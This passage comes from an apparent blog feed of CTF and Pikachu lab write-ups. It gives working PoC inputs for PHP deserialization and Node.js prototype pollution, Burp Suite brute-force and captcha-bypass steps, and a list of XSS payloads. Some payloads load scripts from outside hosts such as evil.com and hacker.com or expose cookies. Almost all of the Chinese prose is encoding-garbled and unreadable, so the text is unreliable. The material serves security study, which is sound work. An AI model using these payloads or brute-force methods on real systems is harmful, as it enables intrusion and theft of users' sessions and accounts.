çš„æ•°ç»„ï¼å¯¹è±¡ä¸­çš„å¼•ç”¨ä¹Ÿå°†è¢«å­˜å‚¨ã€‚</p><p>O:5:â€funnyâ€:2:{s:15:â€%00funny%00passwordâ€;s:1:â€2â€;s:6:â€verifyâ€;r:1;}<br>â€you dieâ€    QAQ<br>Rä¸ºæŒ‡é’ˆå¼•ç”¨ï¼Œå°†ä¸¤ä¸ªå±æ€§æŒ‡å‘åŒä¸€æŒ‡é’ˆåœ°å€<br><code>Pocï¼šO:5:&quot;funny&quot;:2:&#123;s:15:&quot;%00funny%00password&quot;;R:1;s:6:&quot;verify&quot;;R:1;&#125;</code><br>å³å¾—ï¼šGXUCTF{thr33_eq4@15_5i9n_i5_s0_e@sy}</p><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p><img src="https://i.loli.net/2021/02/13/1cTRz4E9yOwPJp2.png"></p><p>è°ƒç”¨pyflag()å³å¯<br>1.@unserialize($_GET[â€˜tryâ€™])();ä¸ºé”™è¯¯çš„è¯­æ³•<br>2.@è¡¨ç¤ºæ— å›æ˜¾ï¼Œå› æ­¤æœ‰äº†å¼€å¤´çš„æŠ¥é”™å®šä¹‰éœ€è¦æˆ‘ä»¬ååºåˆ—åŒ–<br>3.ç›®æ ‡ï¼šé€šè¿‡ä¼ å…¥åºåˆ—åŒ–å‚æ•°ä½¿@unserialize($_GET[â€˜tryâ€™])();ååºåˆ—åŒ–æˆä¸ºfunny::pyflag();<br>åŸæœ‰();å›ºéœ€è¦ä¼ å…¥çš„å‚æ•°ä¸ºï¼šfunny::pyflag;åºåˆ—åŒ–åå¾—åˆ°</p><p><code>pocï¼šs:13:&quot;funny::pyflag&quot;;</code></p><p><img src="https://i.loli.net/2021/02/13/QlS4CIHKPVjwXRx.png"></p><h2 id="Easynodejs"><a href="#Easynodejs" class="headerlink" title="Easynodejs"></a>Easynodejs</h2><p>è€ƒç‚¹æ˜¯    nodejsçš„åŸå‹é“¾æ±¡æŸ“</p><p><img src="https://i.loli.net/2021/02/13/Htu1qTms4S7dhKR.png"></p><p>é¢˜ç›®å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/13/g4sZ51UOv3YjhSL.png"></p><p>é€šè¿‡ä¼ å‚rowã€keyã€valueèµ‹å€¼morouu[row][key]=value</p><p>ä½¿å¾—åˆ¤æ–­æ¡ä»¶yhck[â€˜moneyâ€™] === 100000000000ä¸ºçœŸï¼›è¾“å‡ºflag</p><p><img src="https://i.loli.net/2021/02/13/mPzwrBnDekYZpul.png"></p><p><code>Pocï¼š?row=__proto__&amp;key=money&amp;value=100000000000</code></p><p>å³å¾—flagï¼šGXU-CTF{Wow_No1dejs_is_s0_interesting}</p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pikachué¶åœºçš„å°è®°</title>
    <link href="/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
    <url>/2021/01/16/Pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="Pikachué¶åœºçš„å°è®°"><a href="#Pikachué¶åœºçš„å°è®°" class="headerlink" title="Pikachué¶åœºçš„å°è®°"></a>Pikachué¶åœºçš„å°è®°</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é‡åœ¨çŸ¥è¯†~~éšä¾¿æ‰“æ‰“</p><blockquote><p>æˆ‘è¿½æ±‚çš„å¹¶ä¸æ˜¯ä¸€ä¸ªã€Œç»“æœã€ï¼Œä¸€æ—¦åªè¿½æ±‚ã€Œç»“æœã€ï¼Œäººå°±å®¹æ˜“æƒ³æ–¹è®¾æ³•æŠ„è¿‘è·¯ï¼Œåœ¨æŠ„è¿‘è·¯çš„è¿‡ç¨‹ä¸­ï¼Œäººåˆå®¹æ˜“è¿·å¤±çœŸç›¸ï¼Œåšäº‹çš„å¹²åŠ²ä¹Ÿä¼šé€æ¸æ¶ˆç£¨æ®†å°½ï¼Œæˆ‘è®¤ä¸ºæœ€é‡è¦çš„æ˜¯æƒ³è¦ã€Œè¿½æ±‚çœŸå®ã€çš„æ„å¿—ã€‚â€</p></blockquote><h1 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h1><ul><li><p>çˆ†ç ´å…³å¡æœ‰å››å°å…³</p></li><li><p>æš´åŠ›ç ´è§£å°±åƒä¸€é“å¡«å…¥ç­”æ¡ˆå°±èƒ½çŸ¥é“æ­£ç¡®ä¸å¦çš„é€‰æ‹©é¢˜ï¼Œå››ä¸ªç­”æ¡ˆé€ä¸ªå°è¯•ç›´åˆ°æ­£ç¡®ä¸ºæ­¢<br>ä½†æš´åŠ›ç ´è§£çš„é€‰æ‹©é¢˜ä¸ä¼šç›´æ¥ç»™å‡ºç­”æ¡ˆçš„å†…å®¹å’Œæ•°é‡ï¼Œè¿™æ—¶å°±éœ€è¦ç»“åˆå­—å…¸äº†</p></li><li><p>çˆ†ç ´å…¶å®å¾ˆå°‘èƒ½å¾—å‡ºç»“æœ(å¯¹äºé‚£äº›éµå¾ªäº†è®¤è¯å®‰å…¨ç­–ç•¥çš„ç³»ç»Ÿè€Œè¨€)</p></li><li><p>å…³äºå­—å…¸ï¼š</p><ol><li>é€šè¿‡ç½‘ç«™å¾—åˆ°ç®¡ç†å‘˜æˆ–è€…ç”¨æˆ·çš„å„ç§ä¿¡æ¯ç”Ÿæˆå­—å…¸è¿›è¡Œçˆ†ç ´</li><li>ç½‘ä¸Šä¸€äº›æ±‡æ€»çš„å­—å…¸</li></ol></li></ul><h2 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h2><p>å¾ˆç®€å•çš„ç™»é™†æ¡†<br>burpsuiteæŠ“ä¸€ä¸‹åŒ…ç›´æ¥çˆ†ç ´å³å¯</p><h2 id="éªŒè¯ç "><a href="#éªŒè¯ç " class="headerlink" title="éªŒè¯ç "></a>éªŒè¯ç </h2><p>æ¥ä¸‹æ¥å°±æ¶‰åŠåˆ°éªŒè¯ç äº†<br>éœ€è¦åˆ†æä¸€ä¸‹éªŒè¯ç çš„éªŒè¯æœºåˆ¶ï¼š</p><p>ç¬¬äºŒå…³åœ¨æœåŠ¡ç«¯æ£€æµ‹éªŒè¯ç ï¼Œåˆ©ç”¨burpsuiteçš„repeatæ¨¡å—ï¼Œå…ˆè¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œå†è¾“å…¥é”™è¯¯çš„éªŒè¯ç ï¼Œå†è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œä¸‰æ¬¡å‘é€sendï¼Œè‹¥ç¬¬ä¸‰æ¬¡äºç¬¬ä¸€æ¬¡ç»“æœç›¸åŒåˆ™å¯èƒ½å­˜åœ¨éªŒè¯ç çš„æ— æ¡ä»¶ä¸åˆ·æ–°<br>ç¬¬ä¸‰å…³è¾“å…¥é”™è¯¯çš„éªŒè¯ç ï¼Œä¼šå¼¹å‡ºæ¡†æ¡†å³å‰ç«¯jséªŒè¯</p><h3 id="éªŒè¯ç ç»•è¿‡-on-server"><a href="#éªŒè¯ç ç»•è¿‡-on-server" class="headerlink" title="éªŒè¯ç ç»•è¿‡(on server)"></a>éªŒè¯ç ç»•è¿‡(on server)</h3><p>è¿™é‡Œæ˜¯åœ¨æœåŠ¡ç«¯è¿›è¡Œæ£€æµ‹ï¼Œä½†æ­¤å¤„çš„éªŒè¯ç å¯ä»¥é‡å¤ä½¿ç”¨å³æ— æ¡ä»¶ä¸åˆ·æ–°</p><ul><li>æ— æ¡ä»¶ä¸åˆ·æ–°ï¼šæŸä¸€æ—¶é—´æ®µå†…ï¼Œä¸åˆ·æ–°é¡µé¢å°±å¯ä»¥æ— é™æ¬¡æ•°çš„ä½¿ç”¨åŒä¸€éªŒè¯ç ï¼Œæ— è®ºç™»é™†æˆåŠŸä¸å¦ </li><li>bypass: è¿˜æ˜¯burpsuiteæŠ“åŒ…ï¼Œå°†éªŒè¯ç ä½œä¸ºå¸¸é‡å³å¯</li></ul><h3 id="éªŒè¯ç ç»•è¿‡-on-client"><a href="#éªŒè¯ç ç»•è¿‡-on-client" class="headerlink" title="éªŒè¯ç ç»•è¿‡(on client)"></a>éªŒè¯ç ç»•è¿‡(on client)</h3><ul><li>æ­¤å¤„çš„éªŒè¯ç åœ¨å‰ç«¯è¿›è¡Œæ£€æµ‹</li><li>bypass: ä»ç„¶æ˜¯burpsuiteæŠ“åŒ…ï¼Œç›´æ¥å°†ä¼ é€éªŒè¯ç çš„å‚æ•°å˜é‡å»æ‰å³å¯</li></ul><h2 id="tokené˜²çˆ†ç ´"><a href="#tokené˜²çˆ†ç ´" class="headerlink" title="tokené˜²çˆ†ç ´"></a>tokené˜²çˆ†ç ´</h2><ul><li><p>æŠ“åŒ…å‘ç°æäº¤çš„å˜é‡ä¸­å¤šäº†ä¸€ä¸ªtokenå˜é‡ï¼Œå†å¯¹è¿”å›åŒ…åˆ†æï¼Œå¯ä»¥ç¡®è®¤tokenæ•°å€¼ç”±è¿”å›åŒ…ç¡®å®š<br>å› æ­¤æ¯æ¬¡ç™»é™†éƒ½è¦å°†ä¸Šä¸€ä¸ªè¿”å›åŒ…çš„tokenå€¼æ”¾å…¥å…¶ä¸­</p></li><li><p>åˆ©ç”¨burpsuiteçš„intruderçš„è‰å‰æ¨¡å¼(pitchfork)ï¼šä¸åŒä½ç½®å¯¹åº”ä¸åŒçš„å­—å…¸<br>å¯†ç çˆ†ç ´ä»é€‰æ‹©å­—å…¸ï¼Œtokenéœ€è¦æŠ“å–ä¸Šä¸€ä¸ªè¿”å›åŒ…ï¼š</p></li></ul><h4 id="åˆ©ç”¨burpsuiteé€’å½’æŠ“å–è¿”å›åŒ…"><a href="#åˆ©ç”¨burpsuiteé€’å½’æŠ“å–è¿”å›åŒ…" class="headerlink" title="åˆ©ç”¨burpsuiteé€’å½’æŠ“å–è¿”å›åŒ…"></a>åˆ©ç”¨burpsuiteé€’å½’æŠ“å–è¿”å›åŒ…</h4><ul><li>åœ¨é€‰é¡¹ä¸­ä¿®æ”¹çº¿ç¨‹æ•°ä¸º1(å› ä¸ºæ¯æ¬¡éƒ½è¦æŠ“å–ä¸Šä¸€ä¸ªè¿”å›åŒ…çš„token)</li></ul><p><img src="https://i.loli.net/2021/02/13/7Eqzh5w4GUM8Rri.png"></p><ul><li>ç‚¹å‡»Add</li></ul><p><img src="https://i.loli.net/2021/02/13/mFkKJ7bXnCcgivI.png"></p><ul><li>Refetch responseå¾—åˆ°è¿”å›åŒ…ï¼Œæœç´¢tokenç„¶åé€‰ä¸­å³å¯</li></ul><p><img src="https://i.loli.net/2021/02/13/VDJcv3ZrHMeo4Ip.png"></p><ul><li>é€‰æ‹©é€’å½’æ¨¡å¼ï¼š</li></ul><p><img src="https://i.loli.net/2021/02/13/VkZUvCapz7tTIyP.png"></p><p>Redirections(é‡å®šå‘)é€‰æ‹©always,å°±å¯ä»¥å¼€å§‹çˆ†ç ´å•¦</p><p><img src="https://i.loli.net/2021/02/13/QJgXLfArvGy5WiP.png"></p><h1 id="xssè·¨ç«™è„šæœ¬-jsï¼ï¼ï¼"><a href="#xssè·¨ç«™è„šæœ¬-jsï¼ï¼ï¼" class="headerlink" title="xssè·¨ç«™è„šæœ¬(jsï¼ï¼ï¼)"></a>xssè·¨ç«™è„šæœ¬(jsï¼ï¼ï¼)</h1><p>å¯ä»¥æ‰“ä¸€ä¸‹xss-libs~~~</p><blockquote><p>æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚XSSæ”»å‡»é’ˆå¯¹çš„æ˜¯ç”¨æˆ·å±‚é¢çš„æ”»å‡»ï¼</p><p>å­˜å‚¨å‹XSSï¼šå­˜å‚¨å‹XSSï¼ŒæŒä¹…åŒ–ï¼Œä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼Œæ’å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™è§¦å‘ä»£ç æ‰§è¡Œã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒcookie</p><p>åå°„å‹XSSï¼šéæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢</p><p>DOMå‹XSSï¼šä¸ç»è¿‡åç«¯ï¼ŒDOM-XSSæ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹(Document Objeet Model,DOM)çš„ä¸€ç§æ¼æ´ï¼ŒDOM-XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ï¼Œå…¶å®ä¹Ÿå±äºåå°„å‹XSSã€‚ </p></blockquote><h2 id="å¸¸è§çš„payloadï¼š"><a href="#å¸¸è§çš„payloadï¼š" class="headerlink" title="å¸¸è§çš„payloadï¼š"></a>å¸¸è§çš„payloadï¼š</h2><p>è½¬è‡ª<a href="https://blog.csdn.net/qq_35393693/article/details/86597707?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161041848616780255257057%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=161041848616780255257057&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-86597707.pc_search_result_no_baidu_js&amp;utm_term=xss%E6%94%BB%E5%87%BB">XSS(è·¨ç«™è„šæœ¬)æ¼æ´è¯¦è§£ä¹‹XSSè·¨ç«™è„šæœ¬æ”»å‡»æ¼æ´çš„è§£å†³</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>æ ‡ç­¾ï¼šå¯ä»¥å¼•ç”¨å¤–éƒ¨çš„JavaScriptä»£ç ï¼Œä¹Ÿå¯ä»¥å°†ä»£ç æ’å…¥è„šæœ¬æ ‡è®°<br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #å¼•ç”¨å¤–éƒ¨çš„xss<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> alert(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #å¼¹å‡ºhack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> #å¼¹å‡ºcookie<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img&gt;æ ‡ç­¾ï¼š<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(&quot;hack&quot;)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #å¼¹å‡ºcookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      æ³¨ï¼šå¯¹äºæ•°å­—ï¼Œå¯ä»¥ä¸ç”¨å¼•å·<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&quot;</span>XSS&quot;);&quot;&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">&lt;<span class="hljs-keyword">body&gt;æ ‡ç­¾ï¼š</span><br><span class="hljs-keyword">&lt;body </span>onload=alert(<span class="hljs-string">&quot;XSS&quot;</span>)&gt;  <span class="hljs-comment">#ä½¿ç”¨onloadå±æ€§åœ¨æ ‡è®°å†…éƒ¨ä¼ é€’XSSæœ‰æ•ˆå†…å®¹</span><br>&lt;<span class="hljs-keyword">body </span><span class="hljs-keyword">background=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt; </span><span class="hljs-comment">#æˆ–å…¶ä»–æ›´åŠ æ¨¡ç³Šçš„å±æ€§åœ¨æ ‡è®°å†…éƒ¨ä¼ é€’XSSæœ‰æ•ˆå†…å®¹</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>æ ‡ç­¾ï¼š<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">â€http://evil.com/xss.htmlâ€</span>&gt;</span><br><br>è¯¥<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>æ ‡ç­¾å…è®¸å¦ä¸€ä¸ªHTMLç½‘é¡µçš„åµŒå…¥åˆ°çˆ¶é¡µé¢ã€‚IFrameå¯ä»¥åŒ…å«JavaScriptï¼Œä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œç”±äºæµè§ˆå™¨çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼ŒiFrameä¸­çš„JavaScriptæ— æ³•è®¿é—®çˆ¶é¡µé¢çš„DOMã€‚ç„¶è€Œï¼ŒIFrameä»ç„¶æ˜¯éå¸¸æœ‰æ•ˆçš„è§£é™¤ç½‘ç»œé’“é±¼æ”»å‡»çš„æ‰‹æ®µã€‚<br><br></code></pre></td></tr></table></figure><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">&lt;input&gt;æ ‡ç­¾ï¼šè‹¥æ ‡è®°çš„<span class="hljs-class"><span class="hljs-keyword">type</span>å±æ€§&lt;input&gt;è®¾ç½®ä¸º<span class="hljs-title">image</span>ï¼Œåˆ™å¯ä»¥å¯¹å…¶è¿›è¡Œæ“ä½œä»¥åµŒå…¥è„šæœ¬</span><br>&lt;input <span class="hljs-class"><span class="hljs-keyword">type</span></span>=<span class="hljs-string">&quot;image&quot;</span> src=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link&gt;æ ‡ç­¾ï¼šç”¨æ¥è¿æ¥å¤–éƒ¨çš„æ ·å¼è¡¨å¯ä»¥åŒ…å«çš„è„šæœ¬<br>&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;table&gt;æ ‡ç­¾ï¼šå¯åˆ©ç”¨<span class="hljs-attribute">background</span>å±æ€§æ¥å¼•ç”¨è„šæœ¬ï¼Œè€Œéimage<br>&lt;<span class="hljs-selector-tag">table</span> <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br>&lt;<span class="hljs-selector-tag">td</span> <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div&gt;æ ‡ç­¾ï¼šæŒ‡å®šä¸€ä¸ªèƒŒæ™¯ä»è€ŒåµŒå…¥çš„è„šæœ¬ï¼Œç±»ä¼¼table<br>&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;<br>&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;<span class="hljs-keyword">object</span>&gt;æ ‡ç­¾ï¼šå¯ç”¨äºä»å¤–éƒ¨ç«™ç‚¹è„šæœ¬åŒ…å«<br>&lt;<span class="hljs-keyword">object</span> type=<span class="hljs-string">&quot;text/x-scriptlet&quot;</span> <span class="hljs-keyword">data</span>=<span class="hljs-string">&quot;http://hacker.com/xss.html&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="XSSæ¼æ´çš„æŒ–æ˜"><a href="#XSSæ¼æ´çš„æŒ–æ˜" class="headerlink" title="XSSæ¼æ´çš„æŒ–æ˜"></a>XSSæ¼æ´çš„æŒ–æ˜</h2><p>é»‘ç›’æµ‹è¯•</p><p>å°½å¯èƒ½æ‰¾åˆ°ä¸€åˆ‡ç”¨æˆ·å¯æ§å¹¶ä¸”èƒ½å¤Ÿè¾“å‡ºåœ¨é¡µé¢ä»£ç ä¸­çš„åœ°æ–¹ï¼Œæ¯”å¦‚ä¸‹é¢è¿™äº›ï¼š</p><p>URLçš„æ¯ä¸€ä¸ªå‚æ•°<br>URLæœ¬èº«<br>è¡¨å•<br>æœç´¢æ¡†<br>å¸¸è§ä¸šåŠ¡åœºæ™¯</p><p>é‡ç¾åŒºï¼šè¯„è®ºåŒºã€ç•™è¨€åŒºã€ä¸ªäººä¿¡æ¯ã€è®¢å•ä¿¡æ¯ç­‰<br>é’ˆå¯¹å‹ï¼šç«™å†…ä¿¡ã€ç½‘é¡µå³æ—¶é€šè®¯ã€ç§ä¿¡ã€æ„è§åé¦ˆ<br>å­˜åœ¨é£é™©ï¼šæœç´¢æ¡†ã€å½“å‰ç›®å½•ã€å›¾ç‰‡å±æ€§ç­‰<br>ç™½ç›’æµ‹è¯•(ä»£ç å®¡è®¡)</p><p>å…³äºXSSçš„ä»£ç å®¡è®¡ä¸»è¦å°±æ˜¯ä»æ¥æ”¶å‚æ•°çš„åœ°æ–¹å’Œä¸€äº›å…³é”®è¯å…¥æ‰‹ã€‚</p><p>PHPä¸­å¸¸è§çš„æ¥æ”¶å‚æ•°çš„æ–¹å¼æœ‰$_GETã€$_POSTã€$_REQUESTç­‰ç­‰ï¼Œå¯ä»¥æœç´¢æ‰€æœ‰æ¥æ”¶å‚æ•°çš„åœ°æ–¹ã€‚ç„¶åå¯¹æ¥æ”¶åˆ°çš„æ•°æ®è¿›è¡Œè·Ÿè¸ªï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œç„¶åçœ‹è¾“å‡ºåˆ°é¡µé¢ä¸­çš„æ•°æ®æ˜¯å¦è¿›è¡Œäº†è¿‡æ»¤å’Œhtmlç¼–ç ç­‰å¤„ç†ã€‚</p><p>ä¹Ÿå¯ä»¥æœç´¢ç±»ä¼¼echoè¿™æ ·çš„è¾“å‡ºè¯­å¥ï¼Œè·Ÿè¸ªè¾“å‡ºçš„å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ§åˆ¶ï¼Œå¦‚æœä»æ•°æ®åº“ä¸­å–çš„ï¼Œæ˜¯å¦èƒ½æ§åˆ¶å­˜åˆ°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå­˜åˆ°æ•°æ®åº“ä¹‹å‰æœ‰æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ç­‰ç­‰ã€‚</p><p>å¤§å¤šæ•°ç¨‹åºä¼šå¯¹æ¥æ”¶å‚æ•°å°è£…åœ¨å…¬å…±æ–‡ä»¶çš„å‡½æ•°ä¸­ç»Ÿä¸€è°ƒç”¨ï¼Œæˆ‘ä»¬å°±éœ€è¦å®¡è®¡è¿™äº›å…¬å…±å‡½æ•°çœ‹æœ‰æ²¡æœ‰è¿‡æ»¤ï¼Œèƒ½å¦ç»•è¿‡ç­‰ç­‰ã€‚</p><p>åŒç†å®¡è®¡DOMå‹æ³¨å…¥å¯ä»¥æœç´¢ä¸€äº›jsæ“ä½œDOMå…ƒç´ çš„å…³é”®è¯è¿›è¡Œå®¡è®¡ã€‚</p><h2 id="åå°„å‹xss"><a href="#åå°„å‹xss" class="headerlink" title="åå°„å‹xss"></a>åå°„å‹xss</h2><p>éæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚</p><p>å‰ç«¯-ã€‹åç«¯-ã€‹å‰ç«¯ï¼špayloadç”±å‰ç«¯æäº¤åˆ°åç«¯æ‰§è¡Œï¼Œå†è¿”å›å‰ç«¯</p><h2 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="headerlink" title="åå°„å‹xss(get)"></a>åå°„å‹xss(get)</h2><p>1.åå°„å‹xss</p><p>2.è¡¨å•getå‹æäº¤ï¼Œè¡¨å•ä¸­é™åˆ¶é•¿åº¦ï¼Œç”±äºæ˜¯getå‹ï¼Œå¯ç›´æ¥åœ¨urlä¸­ä¿®æ”¹å‚æ•°</p><p><img src="https://i.loli.net/2021/02/13/Nv2driIsLC5lf1B.png"></p><h2 id="åå°„å‹xss-post"><a href="#åå°„å‹xss-post" class="headerlink" title="åå°„å‹xss(post)"></a>åå°„å‹xss(post)</h2><p>1.åå°„å‹xss</p><p>2.postæäº¤</p><p><img src="https://i.loli.net/2021/02/13/5AvnfNplYb2CqIw.png"></p><p>æ­¤å¤„ç™»å½•æ¡†æ— æ³•æ‰§è¡Œxss</p><p>æç¤ºæˆ‘ä»¬å…ˆç™»å½•</p><p><img src="https://i.loli.net/2021/02/13/6KTyFt9vr35q4Nf.png"></p><p>è¿™é‡Œçš„è¡¨å•æ¡†å°±å¯ä»¥è¿›è¡Œxssæ”»å‡»äº†</p><p>è¾“å…¥kobeæœ‰ä¸ªå°å½©è›‹<img src="https://i.loli.net/2021/02/13/5Dmnq24KgZ1wvQM.png" alt="20210112102605934.png"></p><h2 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" 